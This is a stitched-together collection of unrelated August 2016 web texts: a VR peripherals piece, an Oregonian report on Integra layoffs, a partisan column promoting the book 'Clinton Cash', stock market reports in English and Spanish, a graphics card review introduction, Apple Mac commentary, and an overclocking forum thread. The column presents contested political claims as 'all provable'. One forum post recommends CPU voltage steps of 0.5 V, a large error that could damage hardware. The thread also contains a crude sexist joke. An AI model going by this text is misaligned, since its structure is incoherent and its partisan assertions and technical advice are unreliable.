Considering that focus on peripherals, perhaps it's appropriate that HTC has announced plans to improve support for third party hardware developers to bring new accessories to the Vive system. Valve and Synapse currently offer a three-day course in the US for developers who want to learn how to build their own tracked objects to work with the Vive hardware. With the aim of pushing VR adoption as wide as possible, HTC plans to offer similar courses in Asia, providing engineers with technical support, software, and development and marketing resources. The experience of getting off the couch, walking around the room and moving your arms to control the game give the Vive a leg up on its competition for now, but with Oculus Touch due before the end of the year and Playstation VR arriving in October with Move support (clunky and far behind as that is), that advantage might not last for long. The Vive will still have the advantages of more precise room-sized tracking, 360-degree tracking and boundaries to keep you from bumping into things, but more varied hardware still won't hurt to keep it on the map. Controllers are a decent way to approximate hand movements, but depth-sensing cameras, like future versions of those used in Leap Motion systems could track gestures more naturally. The current version of Leap hasn't worked well in the VR setups we've tried, but more advanced gear could better hit that mark. Recent, now-deleted tweets from an Intel engineer may have even leaked a depth-sensing "unicorn peripheral" that could do just that. And what about the feet? Treadmills like the Virtuix Omni (above) and Kat Walk are bulky and uncomfortable at best, but perhaps eventually a more elegant solution to the problem of moving through larger virtual spaces may come out of these courses. Facial recognition, eye-tracking systems and physical props may be other stepping stones on the long and continuous road to deeper immersion in VR. We won't likely see those in consumer-ready form anytime soon, but, who knows, maybe HTC's initiative will nudge things forward a bit faster. HTC hasn't announced the dates, pricing or other details on its Asian development and training program yet, but says to keep an eye on its website.

(Integra photo) Print Email Mike Rogoway | The Oregonian/OregonLive By Mike Rogoway | The Oregonian/OregonLive The Oregonian Email the author | Follow on Twitter on August 04, 2016 at 1:15 PM, updated August 18, 2016 at 6:57 AM comments Vancouver telecommunications company Integra laid off close to 10 percent of its employees Thursday and said it will split the business in two. Integra will now focus on serving small business customers and take 17 percent of the remaining employees. The broader organization will take the name Electric Lightwave but operate under the same corporate umbrella. It will run the larger portion of the business and provide fiber-optic communications services to large organizations. Privately held Integra provides internet and phone service to business clients across the West. The company has struggled for several years in a highly competitive market, weathered a high degree of executive turnover, and has sought to reposition the business by marketing long-haul fiber-optic communications to large organizations. In a statement to The Oregonian/OregonLive, Integra said it will lay off nearly 10 percent of its workers but didn't disclose just how many that is. It said both Integra and Electric Lightwave will retain Vancouver headquarters. Integra had more than 600 workers in east Vancouver in 2014 after the company moved its headquarters from the Lloyd District in Portland, plus several hundred more in other parts of the country. It is among the largest tech employers in the region. While Integra did not say just how many people lost their jobs, employees pegged the number at well over 100 -- perhaps numbering a few hundred. They said they expect the cuts will be concentrated in Colorado and Minnesota, markets where Electric Lightwave has little fiber presence. "We greatly value the contributions of every employee, and we understand change is never easy," Integra spokeswoman Ani Vattano said in a written statement. "We are committed to providing resources to those that will be leaving us." The new Electric Lightwave takes the name of a large, competitive telecom company based in Vancouver during the 1990s. It spent more than $1 billion building a massive fiber network in the western U.S. But Electric Lightwave struggled to market that network as other companies had built similar networks, creating far more fiber capacity than the nascent internet needed at the time. Integra bought Electric Lightwave in 2006 for $247 million and retired the brand. In recent years, though, Integra revived the name and has focused on marketing that dormant fiber amid growing demand for communications services. The new, smaller Integra will focus on providing competitive telecom services in Minnesota, North Dakota and Colorado, led by current Integra general manager Brady Adams. It will also serve small businesses across Integra's former territory. The portion of the business called Electric Lightwave will generate revenue at an annual rate of $429 million, according to the company, from a fiber network that runs more than 400,000 miles in western states from Montana to Arizona. Marc Willency, who has been Integra's chief executive, will be Electric Lightwave's CEO. The Silicon Forest economy is robust, with Oregon tech employment rising last year at its fastest rate in a decade. Clark County is enjoying a tech renaissance, too, with HP Inc. expanding its 3-D printing operations and a cluster of younger companies emerging to mirror Portland's thriving tech scene. This year, however, the regional tech industry has weathered a number of setbacks. The most notable is Intel, which is eliminating 11 percent of its global work force in a bid to reposition the company for a post-PC era. Intel laid off 784 in April in a first wave of cuts and is eliminating hundreds more jobs through buyouts, early retirements and project cancellations. Jive Software and Jama Software have each laid off much smaller numbers of employees this year, and the future size of FEI Co.'s operations in Hillsboro is uncertain amid the company's pending, $4.2 billion sale to Massachusetts-based Thermo Fisher Scientific. Clarification: This article has been updated to clarify that Electric Lightwave and Integra will still be part of the same corporate organization, and to attribute the size of the layoffs to a statement from Integra itself. -- Mike Rogoway mrogoway@oregonian.com 503-294-7699 @rogoway Inside Silicon Forest About Mike Rogoway Email Mike Rogoway Follow @rogoway Most Read Active Discussions About Us About OregonLive.com Advertise with us Contact the newsroom Frequently Asked Questions Join our team Our Journalists Contact Subscriber Services Subscribe Today The Oregonian Email Newsletters Already a Subscriber Manage your Subscription Delivery Feedback Place a vacation hold Make a payment OregonLive.com Sections News Business Sports High School Sports Entertainment Living Travel Opinion Obituaries Jobs Autos Real Estate Rentals Classifieds Local Deals Local Businesses Your Regional News Pages Clackamas County Clark County Gresham Portland Washington County More Local News Mobile iPhone, Android apps | Tablet Apps More on OregonLive.com Forums Videos Photos Interact with us Weather Post a job Post a classified ad Sell your car Sell/rent your home Sitemap & search Sponsor Content Follow Us Twitter | Facebook | Google+ | Pinterest | Instagram | Tumblr Registration on or use of this site constitutes acceptance of our User Agreement and Privacy Policy © 2016 Oregon Live LLC.

It does not matter how inadvertent such assistance may be. The results make the Democrat nominee a walking threat, whether by her thirst for power or her personal "convenience" (see e-mail scandal). What America reads Enter the story of the Clintons' power play and "questionable" money-hunt, as exposed in the book Clinton Cash. Author Peter Schweizer reveals a uranium deal involving the Clinton Foundation and the Russian reset (proposed by Hillary when Secretary of State). At the very least, he writes, we get out of the "bargain" a tougher competitor in legitimate commerce. At worst, they end up with advanced U.S. technology that can be sold to our deadliest enemies. "Reset" for whom? This book is a treasure trove of information, complete with a parade of the smallest but most relevant details, as to how "Clinton Cash" has provided Russia's Vladimir Putin with the arms that could assist any "hate America" country that has the United States of America in its sites. Schweizer approaches this fact-filled venture (of which the uranium deal is but one part) with strong credentials. His first of several books issued (shortly after the end of the Cold War) was titled Victory, which unveiled the most complete (up until then) narrative as to how President Reagan brought down the Soviet Union without resorting to a shooting war. (The late Defense Secretary Casper Weinberger, on my last Crosstalk radio interview, predicted Mr. Schweizer would make waves in the years ahead.) Though his current book lacks an index, a time-consuming annoyance to researchers, the wave-maker's findings have appeared in condensed form in The Wall Street Journal and the New York Post. Coincidence? "We don't have an e-mail or a pirated voice-mail message saying, 'We'll give you money if you help us with Skokovo (Russia's Silicon Valley),"' he told the N.Y. Post. "But what we do have," the author adds, "is a pattern that shows a high percentage of participants of Skokovo who happen to be Clinton Foundation donors." Or "neat deal"? So here's the way it works: The Clintons get their donations and speaking fees in the millions. The Russians get access to American technology. And tech companies (including Intel, Microsoft) get access to Russian markets and workers (as unemployment in the U.S. remains dismal) ....and...and... What about us? America, on the other hand, ends up with "nothing," according to Schweizer. If anyone can think of a logical answer or observation to contradict the record, don't ask the Clinton campaign. Those people have been contacted and asked. No comment. This is serious stuff. We don't really know how many people attending or watching the Democrat National Convention have even heard of the Clinton Foundation. Can you imagine this?: It's been the Clintons' major focus for years. Foundations are best known for their "laudable contributions" to the betterment of mankind, whatever questionable projects they may also fund. Given all that, why is it you never heard any mention of that entity during the entire four days of the Hillary coronation. Nothing? It is not that the Clintons, being politicians, normally shy from spotlighting anything that makes them look good. Are they hiding something from public view? That isn't all It really isn't enough to consult the newspapers or the columns, including this one. You really need to read the book. There is much there. The author includes many details, all provable. That is in addition to the deal discussed above wherein Secretary of State Clinton was involved in granting nearly 50 percent of American domestic uranium output (yes, you read that right) to the Russian government, benefiting large donations to the Clinton Foundation. Others include: ....Bill's speeches for which he received large payments from foreign businesses and governments with issues pending before the State Department... or the mysterious multimillion dollar Foundation gift from a mysterious Indian politician that coincided with Senator Clinton's reversal on the nuclear non-proliferation treaty. Clinton Cash is chock-a-block with case histories of these and other infractions to ethical and/or legal practices. Warning The book is not what you would call "beach reading." Again, it is detailed, and includes cases of the kind likely to require painstaking attention to connect the dots. The informed voter is one of the best weapons available to bar Bill and Hillary's scandal-loaded return to the White House. Clinton Cash warrants a careful reading. © Wes Vernon   The views expressed by RenewAmerica columnists are their own and do not necessarily reflect the position of RenewAmerica or its affiliates.

The Dow Jones Industrial fell 2.95 or 0.02% to 18,352.05, while the S&P 500 Composite index inched up 0.46 or %, as stocks remained stuck in tight, range bound trading. On the S&P 500, four of 10 sectors closed higher as stocks in the Technology and Consumer Goods industries led. Stocks in the Energy, Utilities and Financials sectors lagged, each falling by more than 0.20% on the session. The NASDAQ Composite index, meanwhile, rose 6.51 or 0.13% to 5,166.25, inching closer to an all-time record high. Global equities received a boost on Thursday morning after the BOE lowered its benchmark rate by 25 basis points to a record-low of 0.25%, marking its first interest rate cut since 2009. In addition, the Bank of England's Monetary Policy Committee increased its asset purchasing by £60 billion and announced a plan to begin buying £10 billion in corporate bonds in an effort to help stimulate economic growth. Bank of England governor Mark Carney also indicated that the MPC could implement further rate cuts if inflation meets its targeted objectives in the coming months. Meanwhile, investors continued to await Friday's July employment report in the U.S. for further indications on the strength of the domestic labor market. Analysts expect to see an increase of 185,000 in nonfarm payrolls, one month after the economy added a robust 287,000 jobs in June. The Federal Reserve could consider a rate hike this fall if the labor market displays continued improvement before the U.S. central bank meets again in late-September. The top performer on the Dow was Intel Corporation (NASDAQ:INTC), which added 0.32 or 0.92% to 34.57. Intel finished just ahead of Visa Inc (NYSE:V), which gained 0.70 or 0.89% to 79.41. It came one day after Visa's subsidiary CyberSource launched a Loyalty Fraud Solution initiative aimed at helping businesses protect against fraudulent use of their loyalty accounts. Each year, consumers receive an estimated $238 billion in loyalty rewards through airlines, hotels and other earnings, according to the RFI Group. "This type of fraudulent activity not only impacts the profitability of businesses, but also hurts customer trust and loyalty — the very things these programs were designed to build," said Andre Machicao, senior vice president, CyberSource.

By: Anthony Garreffa | NVIDIA GeForce GPU in Video Cards | Posted: Aug 5, 2016 7:07 pm Comment | Email to a Friend | Font Size: AA Page 1 [Introduction & Test Setup Configuration] Page 1 [Introduction & Test Setup Configuration] Page 2 [Benchmarks - Synthetic] Page 3 [Benchmarks - 11,520 x 2160] Page 4 [Performance Analysis & Final Thoughts] Introduction   I still remember back to when NVIDIA released the GeForce GTX Titan X, and with its 12GB of GDDR5, it was a monster. Multi-monitor setups like triple 4K with a native resolution of 11,520 x 2160 are starved of frame buffer and memory bandwidth, which is why I like to test these resolutions with new graphics cards.     We're back again with NVIDIA's new Pascal-based Titan X graphics card, which has quite the leap in virtually every way over the Maxwell-based GeForce GTX Titan X. The original Titan X was made on the 28nm FinFET process with 3072 CUDA cores and its GPU clocked at 1.08GHz while the new Titan X is made on the exciting new 16nm FinFET process with 3584 CUDA cores and the GPU clocked at 1.53GHz. This offers around 60% more performance over the original Maxwell-based Titan X, and a pretty decent 20% or so leap over the current GeForce GTX 1080.     NVIDIA's new Titan X still features 12GB of VRAM, but the company has used the faster GDDR5X standard that it used on the GeForce GTX 1080. The 12GB of GDDR5X has 10Gbps of bandwidth, and on the 384-bit memory bus, we're looking at a hefty 480GB/sec of memory bandwidth, an increase 42.8% from the 336GB/sec on the GeForce GTX Titan X. The boost comes courtesy of the increased 10Gbps bandwidth on the GDDR5X memory, compared to the 7Gbps on the Maxwell-based Titan X.   The increased 480GB/sec memory bandwidth is something I wanted to test with 11,520 x 2160, as I suspected it would provide a huge increase over the 8GB of GDDR5X on the GTX 1080, as its 256-bit memory bus is only providing the card with 320GB/sec memory bandwidth available.     If you thought 2560x1440 or even 3840x2160 was hard on a video card or two, then you'll want to see how the new Pascal-based Titan X handles 11,520 x 2160. Running three 4K monitors isn't an easy task, but with the right amount of desk space and the right hardware, man is it a blast to play on. We don't have the hardware to comfortably play games at 60FPS+ at 11,520 x 2160 - so that's what we're to see - how far away are we from ~8K @ 60FPS average on 1-2 graphics cards?   We've been doing 11,520 x 2160 testing for a while now, with one of the last ones being the 4-way AMD Radeon R9 Fury X cards in CrossFire, which didn't turn out so well. We thought we'd re-run our testing with some new games, fresh drivers, and the new GeForce GTX 1080.     How Many Pixels Are We Rendering?   11,520 x 2160 consists of three 4K monitors, with each monitor running 3840 x 2160, combining all of the resolutions together for the massive 11,520 x 2160 resolution. But just how many pixels are we rendering here, versus 1080p, 1440p, 4K, and even consoles?       Test Setup Configuration     Anthony's Video Card Test System Specifications   Motherboard: ASUS Rampage V Extreme - Buy from Amazon / Read our review CPU: Intel Core i7 5960X - Buy from Amazon / Read our review Cooler: Corsair H110 - Buy from Amazon / Read our review Memory: Kingston 16GB (4x4GB) HyperX Predator DDR4 3000MHz - Buy from Amazon Storage #1: SanDisk Extreme II 240GB - Buy from Amazon / Read our review Storage #2: Intel 730 Series 480GB - Buy from Amazon / Read our review Case: Lian Li PC-T80 Open-Air - Buy from Amazon Power Supply: Corsair AX1500i - Buy from Amazon / Read our review OS: Microsoft Windows 10 Home 64-bit - Buy from Amazon Drivers: NVIDIA GeForce 369.38 and AMD Radeon Software Crimson Edition 16.7.3 Next Page Shopping Information PRICING: You can find products similar to this one for sale below.

Nueva York, 5 ago (EFE).- Wall Street ampliaba las ganancias y a media sesión dos de sus principales indicadores, el selectivo S&P 500 y el índice compuesto del mercado Nasdaq, se situaban en máximos históricos, mientras que el Dow Jones subía más de 150 puntos. El S&P 500 subía a esta hora un 0,82 % hasta 2.182,05 puntos, por encima de su último récord histórico fijado en 2.175,03 enteros, mientras que el Nasdaq progresaba un 1,14 % hasta 5.225,23 unidades, también por encima de su máximo histórico de 5.218,86 unidades. Por su parte, el Dow Jones de Industriales avanzaba hacia mitad de la jornada un 0,89 % (162,99 puntos) y se ubicaba en 18.515,04 unidades, cada vez más cerca de su récord histórico fijado en 18.595,03 unidades. Hacia el ecuador de la jornada los operadores en el parqué neoyorquino seguían apostando decididamente por las compras impulsados por el buen sabor de boca que dejó en Estados Unidos el informe oficial de empleo publicado por el Departamento de Trabajo. La tasa de desempleo se mantuvo en julio en el 4,9 %, con una fuerte creación de 255.000 nuevos puestos de trabajo que superó ampliamente las expectativas de los analistas, que como el mes anterior volvieron a quedarse cortos en sus previsiones. Los datos reafirman el buen momento del mercado laboral, que ha creado más de diez millones de empleos desde el fin de la recesión en 2009, y refuerza los argumentos para que la Reserva Federal (Fed) suba los tipos de interés más pronto que tarde. Casi todos los sectores cotizaban al alza, como el financiero (1,32 %), el tecnológico (1,09 %), el industrial (0,93 %), el energético (0,55 %) o materias primas (0,22 %), mientras bajaba el de empresas de servicios públicos (-0,62 %) o el sanitario (-0,26 %). La farmacéutica Merck lideraba las ganancias entre la inmensa mayoría de los 30 valores del el Dow Jones, con una fuerte subida del 7,52 %, por delante de JPMorgan (2,46 %), American Express (2,43 %), Goldman Sachs (2,08 %) o Nike (1,81 %). También subían más de un punto porcentual Apple (1,65 %), Intel (1,30 %), Caterpillar (1,15 %) o Microsoft (1,00 %), mientras que al otro lado de la tabla solo bajaban Verizon (-0,46 %), Chevron (-0,19 %) y Procter & Gamble (-0,02 %). En otros mercados, el petróleo de Texas bajaba a 41,57 dólares, el oro retrocedía a 1.344,7 dólares la onza, la rentabilidad de la deuda pública a diez años avanzaba al 1,566 % y el dólar ganaba terreno frente al euro, que se cambiaba a 1,1082 dólares.

 Even Microsoft agrees: Apple really needs to release new computers Kif Leswing Aug. 5, 2016, 9:53 AM 13,875 facebook linkedin twitter email print Getty It's a bad time to buy a Mac — Apple hasn't redesigned its MacBook Pro or MacBook Air laptops in years. People are starting to notice that Apple's computers don't have the latest processors or technology, and it's taking a toll on sales. Even Microsoft employees think Apple has to do something. "I compete with Apple and respect them. But they ARE doing their customers a disservice at times with old tech," Brian Hall, Microsoft's Surface general manager, tweeted. He leads Microsoft's devices business, and he's right. The MacBook Air was last redesigned six years ago. The MacBook Pro's design hasn't changed since 2012. Many of Apple's Macs haven't been updated with the latest processors recently either. Maybe that's why Apple's computer shipments shrunk 11.5% annually last quarter. Although the Mac is not Apple's cash cow, it is Apple's oldest line of computers, and it remains critical to the company. If the iPad is a car, the Mac is a truck: It's needed for heavy-duty jobs, including coding or serious web development. The vast majority of people making iPhone apps are doing so on a Mac. Apple doesn't have a fresh model for the back-to-school push; however, it's very likely that Apple will release a new Mac computer this fall before the holiday season. Current rumors suggest a new MacBook Pro with a new touchscreen keyboard and the latest and greatest Intel chips. In the meantime, Microsoft would be happy to sell you a Surface or Surface Book. My colleague Matt Weinberger likes the Surface Book so much that he's switched from MacOS to Windows 10 permanently.

By Thomas Ricker on August 5, 2016 07:30 am @Trixxy 163 Tweet Share Share on Facebook Tweet Share Pin Share Yesterday my colleague Sam Byford beefed about Apple’s habit of selling outdated laptops and desktops, some of which haven’t had spec bumps in years despite the availability of faster components like CPUs and GPUs. That got me to wondering: how old is your primary laptop or desktop computer? There was a time that I would never consider using a laptop or desktop that was more than a few years old. I’m talking back in the days when Macs were used primarily as digital hubs in the home and workplace PCs needed new Intel or AMD processors just to keep pace with the latest versions of Windows and Office. Now, however, we’re keeping our computers longer, thanks in part to the computing load being distributed across phones, tablets, and fast connections to the cloud. Lightweight desktop OSes that work well on older machines have also helped extend the life of our computing hardware. "[The] replacement cycle for the PC has extended," said intel CEO Brian Krzanich in June. "Four years was the average, now it has moved to about five to six years." A trend that computer makes don't like, to say the least. My primary computer is a three-year-old iMac that feels just as fast as the day I got it. What about you, how old is your primary computer?

So I am just wondering if the extra heat is worth it in my case plus the xtra power draw for such a small return? The stock settings are very nice which are 4.4ghz turbo disabled running 1.250 v-core. Overclocked at 4.8 Ghz it took me 1.359 V-core, and in some cases up to 1.500 v-core in order to maintain that speed. I have a Corsair H-80 push/pull so nothing really to high-end here, the weird thing is despite such a high cpu voltage the temps are remaining in check 60-65c during gaming, 40-30c idol/browsing net. So what schould I do go back to stock settings or continue with my overclock? Please note the v-core was set by my Motherboard not me, I have a Gigabyte Z97 X Gaming 7 so I am confident I can get away using a little less voltage problem is (intel) has so many knobs to turn in the bios that I am overwelmed. Any help and tips I would very much appricate.

Are you sure? You monitoring that right? You'll fry that chip. As for overclocking it really depends. Do you really need that extra processing power?

I didn't played too much after that as I went with X99 Hope this helps and good luck there Thanks,Jura     jura11 View Public Profile Find all posts by jura11   (#7) nz3777 Maha Guru     Videocard: Evga Gtx 780 Acx Sc Processor: Fx 8320 E @ 4ghz Mainboard: Gigabyte Z97 X Gaming7 Memory: 8gb 1600mhz/Ballistic Soundcard: SoundBlaster Recon 3d PSU: Corsair Hx 850 08-05-2016, 02:59 | posts: 1,283 | Location: Willowbrook ill. Ok the earlier results where using the Gigabyte motherboard bios- For some reason it set my v-core sky high or I did something wrong, Probbly the 2nd thing lol. I went ahead and used Intel extremme tuning utlity instead and i got 4.6Ghz @ 1.250-1.255 V-core which is MUCH better. I am running a few tests with a few games ( time is the problem) but honestly I cannot tell a diffrence from 4.4ghz and 4.6Ghz in gaming so far! Only diffrence is apps and programs load a little quicker? Thanks everyone for the great tips, You guys rock!

Undervolt it by around -0.5v each time and stress the system with a real world application test something like Asus RealBench Benchmarking tool is great and gives a much better representation of how a chip performs at a speed and also puts proper load on the CPU that you would do in normal tasks unlike synthetic tests like prime95. ADIA64 tester is also a good tool too. Loop the test 3 times and then decrease voltages again by 0.5v until the system becomes unstable and that is your real lowest voltage for the chip. Then you can go ahead and test it with the RAM speed set to whatever the speed of the modules are, the reason for leaving it at 1333MHz is to rule out any possibility of faulty modules or putting too much stress on the memory controller. Once stable then you can begin to raise the CPU multiplier and test until unstale then start increasing the voltage by +0.5v at a time until stable then move back to the multiplier. 1.5 is crazy high for that chip like others have said.     CPC_RedDawn View Public Profile Find all posts by CPC_RedDawn   (#9) CalculuS Maha Guru     Videocard: GTX 970 1505/+60 Processor: i5 3570k @ 4.5Ghz/1.21V Mainboard: ASRock P67 PRO3 SE Memory: 8GB Corsair CL8/1600mhz Soundcard: Xonar DG (Twiddles) PSU: CM Thunder 700W 08-05-2016, 13:07 | posts: 2,599 | Location: Netherlands 1.5v is AMD overclock territory.

For CPU & RAM overclock via BIOS settings is the only option you should consider, forget about CPU/RAM OC via any kind of software because sooner or later something would go wrong for sure. GPU OC is different story, for GPUs first option is OC via software (MSI AB...etc), after that BIOS modding or eventually HW modding.     CrazY_Milojko View Public Profile Find all posts by CrazY_Milojko   (#14) nz3777 Maha Guru     Videocard: Evga Gtx 780 Acx Sc Processor: Fx 8320 E @ 4ghz Mainboard: Gigabyte Z97 X Gaming7 Memory: 8gb 1600mhz/Ballistic Soundcard: SoundBlaster Recon 3d PSU: Corsair Hx 850 08-05-2016, 15:07 | posts: 1,283 | Location: Willowbrook ill.

Some OC related things you can't forget, like riding a bike, it just needs a bit of a practice Just take it easy with OC, relax, make notes with pen&paper, do some research on the web, save every successful OC attempt under sepparate motherboard's BIOS OC profile, test, test, test.... and when you find high and stable enough OC try to back Vcore a bit to find if its gonna run stable undervolted: less Vcore = less heat and less stress to CPU. OC is like a woman: after first time you will ask yourself if you did it right, later you won't remember how many times you did it right edit And when it starts to scream because of the insane speed stressed with some "benchmark" then you'll know you got the OC sweet spot I'm talking about stressing a PC, of course Last edited by CrazY_Milojko; 08-05-2016 at 16:58.     CrazY_Milojko View Public Profile Find all posts by CrazY_Milojko   (#17) nz3777 Maha Guru     Videocard: Evga Gtx 780 Acx Sc Processor: Fx 8320 E @ 4ghz Mainboard: Gigabyte Z97 X Gaming7 Memory: 8gb 1600mhz/Ballistic Soundcard: SoundBlaster Recon 3d PSU: Corsair Hx 850 08-05-2016, 17:27 | posts: 1,283 | Location: Willowbrook ill.

Intel Sandy and Ivy generation CPU's are much easier to OC from my experience, less things you should mess with to get a decent 4.5, 4.6GHz+ OC. Haswell brings lots of new things to the OC table, new things you should check trice when you get yourself into heavy OC. Some good starting points about Haswell OC you can find at these links: Haswell Overclocking Thread and maybe this one also: 3 Step Guide to Overclock Your i7 / i5 Haswell Platform ^^^Prepare lots of coffe for reading this... But honestly, do you really need to go faster than 4.4GHz on your 4790K (guess its running with HT on) paired with GTX 780? I really don't think so, if I was on your place I would try to push that 780 puppy to 780Ti'ish level with gpu/mem OC around 1100+/~6600 (Elpida mem chips) or even 7000+ (Hynix and Samsung mem.chips).

You guys are right 4.4ghz schould be just fine. Now as far as my gpu goes it has Samsung memory currently running at 1163 Mhz Gpu core and 3054 Mhz on the memory. I think I can get it up even higher but honestly no need.I will save it for when I get a Gtx 1080 then I will dial-in a decent overclock ( Hopefully) lol. Thanks again guys,Sorry to be a burden.

I just don't see the point of more heat, voltage, wear and tear on an OC you would only see the difference in a Benchmark Well i do see some difference by very cpu bound games. Especially a little older where every mhz counts. Or even by newer gta5, dying light, crysis3, bf3 & 4, natural selection2, serious sam3, x rebirth, to name a few. I also run mine at 4.7ghz just because its still possible @H90 cooler anything higher and its too much. Actualy 1.30+v is "killing" it those 3d gate transistors get really hot after that. If I got a bit better cooling I would probably run 4.8ghz too - needs ~1.33v Last edited by -Tj-; 08-05-2016 at 20:22.     -Tj- View Public Profile Find all posts by -Tj-   (#22) Valken Maha Guru   Videocard: HIS 6950 2GB CFX unlocked Processor: Intel i7-4970k Mainboard: Asrock Z97 OC Formula Memory: 32GB G.Skill 2400 CL10 Soundcard: ALC1150 + X-Fi MB3 PSU: Corsair RM1000 08-05-2016, 20:24 | posts: 1,060 If you mainly game in Total War, Fallout, ARMA or maybe in Crysis engine games, I would definitely say yes. Those game engines are very cpu limited (bad coding or multithreading engines). Otherwise, I would do as others have said and get a nice low power OC and maybe upgrade your GPU instead if you need better performance.     Valken View Public Profile Find all posts by Valken   (#23) CrazY_Milojko Maha Guru     Videocard: GTX760 / R9 270X / GTX970 Processor: i7-920C0 i7-2600K X5670 Mainboard: mostly LGA1366 & LGA1155 Memory: 24 / 16 / 24 DDR3 1866 Soundcard: int.RealtekHD on all rigs PSU: lots of them :) 08-05-2016, 20:42 | posts: 1,507 | Location: Serbia, Indjija Quote: Originally Posted by nz3777 You guys are right 4.4ghz schould be just fine.

I will check out that Haswell oc guide thank you Milojko! Coffee is set-up haha. 1163MHz OC for GPU on GTX 780 is just fine, better binned chips could do between 1200 and 1250 on air, 1300+ on water but... but it's hot summer atm, why raping that Kepler chip for few more % of performance. But when it comes to mem OC those 3054MHz (2x 3054 = 6018 MHz GDDR5) are nothing for those Samsung mem.chips, few MHz above reference mem.clock. I think you should consider mem OC around 7000 (2x 3500) or even more, GTX 780 benefits a lot from mem OC. I'm talking from experience with my MSI 780 Lightning I sold year and so ago. Either you're going to OC that 4790K or not I suggest you to read those articles above, at least first one. Some of those things will left inside that stubborn Balkan head of yours and later when GTX 1080 comes to visit small refresh of memory while rereading that article and you're ready to push that 4790K to it's limits so that he could feed that 1080 proppery. edit lol 2x 3054 = 6018 honestly, I didn't drink anything fo weeks 6108 Last edited by CrazY_Milojko; 08-05-2016 at 23:58.     CrazY_Milojko View Public Profile Find all posts by CrazY_Milojko   (#24) nz3777 Maha Guru     Videocard: Evga Gtx 780 Acx Sc Processor: Fx 8320 E @ 4ghz Mainboard: Gigabyte Z97 X Gaming7 Memory: 8gb 1600mhz/Ballistic Soundcard: SoundBlaster Recon 3d PSU: Corsair Hx 850 08-05-2016, 22:40 | posts: 1,283 | Location: Willowbrook ill. Lol! Memory on the Gpu is ( samsung) like I said and according to afterburner Its set to plus + 50 Mhz on the memory clock, I will try some Higher clocks and see what happens. In the mean time I will leave the 4790k at 4.4 Ghz and just stick with Overclocking the Gpu like you guys suggested,Besides its a 2nd hand card ( used) so if it goes I wont be so mad.I will Increase by 5-10 Mhz then test for stability. Yeah when its time for The Gtx 1080 to come-in I will squeeze out as much as I can out of it in order not to be ( bottlenecked) everyone's favirot word.
